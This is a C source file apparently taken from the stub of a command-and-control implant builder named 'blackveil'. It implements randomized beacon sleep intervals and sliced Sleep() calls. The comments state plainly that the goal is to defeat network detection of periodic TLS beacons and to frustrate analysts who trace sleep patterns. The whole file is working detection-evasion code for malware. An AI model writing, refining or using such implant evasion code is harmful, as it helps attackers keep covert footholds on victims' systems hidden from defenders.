/* blackveil/builder/stub/jitter.c
 *
 * Beacon jitter defeats periodic-traffic detection: a fixed-interval
 * TLS beacon is trivially flagged by any NDR that models traffic
 * entropy. ±30% is enough to break the periodicity while keeping
 * operational latency acceptable. Higher jitter means slower task pickup.
 */
#include "jitter.h"
#include <stdlib.h>
#include <time.h>

static unsigned int _seed_once(void) {
    static int seeded = 0;
    if (!seeded) {
        LARGE_INTEGER perf;
        QueryPerformanceCounter(&perf);
        srand((unsigned)(perf.QuadPart ^ GetTickCount() ^ GetCurrentProcessId()));
        seeded = 1;
    }
    return 0;
}

DWORD bv_jittered_sleep(DWORD base_ms, DWORD jitter_pct) {
    _seed_once();
    if (jitter_pct == 0) return base_ms;
    if (jitter_pct > 100) jitter_pct = 100;

    LONG span = (LONG)((double)base_ms * (jitter_pct / 100.0));
    LONG delta = (LONG)(rand() % (span * 2 + 1)) - span;
    LONG result = (LONG)base_ms + delta;
    if (result < 1000) result = 1000;
    return (DWORD)result;
}

void bv_jittered_sleep_ex(DWORD base_ms, DWORD jitter_pct) {
    DWORD total = bv_jittered_sleep(base_ms, jitter_pct);
    DWORD elapsed = 0;
    /* Sleep in random 1.5–4.5s slices. The slice count is not fixed;
     * an analyst tailing Sleep() calls sees no repeating pattern. */
    while (elapsed < total) {
        DWORD slice = 1500 + (rand() % 3000);
        DWORD remaining = total - elapsed;
        if (slice > remaining) slice = remaining;
        Sleep(slice);
        elapsed += slice;
    }
}
